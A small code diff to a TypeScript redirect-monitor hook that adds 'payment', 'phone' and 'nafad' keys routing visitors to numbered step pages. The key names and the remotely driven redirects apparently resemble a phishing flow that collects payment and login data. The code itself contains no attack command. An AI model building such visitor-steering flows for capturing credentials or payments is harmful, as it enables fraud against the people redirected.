@@ -42,8 +42,11 @@ export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonito
               'insur': '/insur',
               'compar': '/compar',
               'check': '/check',
+              'payment': '/step4',
               'veri': '/step2',
-              'confi': '/step3'
+              'confi': '/step3',
+              'phone': '/step5',
+              'nafad': '/step4'
             }
             
             const targetUrl = pageMap[redirectPage] || '/'
